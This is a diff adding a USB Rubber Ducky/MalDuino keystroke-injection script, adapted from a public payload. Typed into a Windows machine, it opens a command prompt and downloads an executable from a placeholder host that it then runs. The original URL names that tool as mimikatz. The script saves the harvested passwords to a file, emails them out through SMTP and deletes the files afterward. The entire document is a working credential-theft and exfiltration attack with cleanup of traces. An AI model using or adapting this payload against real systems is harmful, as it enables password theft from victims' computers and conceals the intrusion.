@@ -1,0 +1,67 @@
+REM Original Author: Pesce
+REM Original URL: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---download-mimikatz%2C-grab-passwords-and-email-them-via-gmail
+REM Creation Date: 10/20/2013
+REM Editor: davidlj95
+REM Edition Date: 14/07/2017
+REM Note: This RubberDucky script has not been tested RAW as was converted with malduino.com/converter to create an Arduino project with later introduced fixes and improvements. It should work, though.
+REM 1. Open CMD
+DELAY 3000
+CONTROL ESCAPE
+DELAY 1000
+STRING cmd
+DELAY 1000
+ENTER
+DELAY 300
+REM 2. Download tool (host it in your server)
+STRING powershell (New-Object System.Net.WebClient).DownloadFile('http://example.org/example.exe','%TEMP%\pass.exe');
+ENTER
+REM (Customize your download time below)
+DELAY 5000
+REM 3. Save the passwords
+STRING %TEMP%\pass.exe
+ENTER
+DELAY 3000
+CTRL A
+CTRL S
+DELAY 400
+STRING %TEMP%\pass.txt
+DELAY 200
+ENTER
+DELAY 400
+ALT F4
+DELAY 300
+REM 4. Send them via email
+STRING powershell
+ENTER
+DELAY 300
+STRING $SMTPServer = 'smtp.example.org'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('user@example.org', 'your_password');
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'from@example.org'
+ENTER
+STRING $ReportEmail.To.Add('to@example.org')
+ENTER
+STRING $ReportEmail.Subject = 'MalDuino Passwords for ' + $(hostname)
+ENTER
+STRING $ReportEmail.Body = 'Attached is your information file.' 
+ENTER
+STRING $ReportEmail.Attachments.Add($env:temp + '\pass.txt')
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+REM 5. Clean everything
+STRING del %TEMP%\pass.*
+ENTER
+DELAY 300
+STRING exit
+ENTER
